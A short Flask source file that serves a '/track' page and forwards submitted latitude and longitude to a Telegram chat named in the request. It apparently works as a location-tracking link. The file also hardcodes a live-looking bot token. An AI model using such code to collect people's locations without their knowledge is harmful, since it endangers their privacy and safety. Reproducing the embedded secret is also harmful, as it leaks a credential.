import os
from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__)

# Replace with your actual bot token if not using environment variable
BOT_TOKEN = "6488229790:AAF4z5GLHrD8j5pGulTICI09suUlHZvaldA"

@app.route("/track")
def track():
    return render_template("index.html")

@app.route("/send_location", methods=["POST"])
def send_location():
    try:
        data = request.get_json()
        lat = data.get("lat")
        lon = data.get("lon")
        user_id = data.get("id")

        if not lat or not lon or not user_id:
            return jsonify({"status": "error", "message": "Missing data"}), 400

        message = f"📍 Location Received:\nLatitude: {lat}\nLongitude: {lon}"

        resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
            "chat_id": user_id,
            "text": message
        })

        return jsonify({"status": "success", "telegram_response": resp.text}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
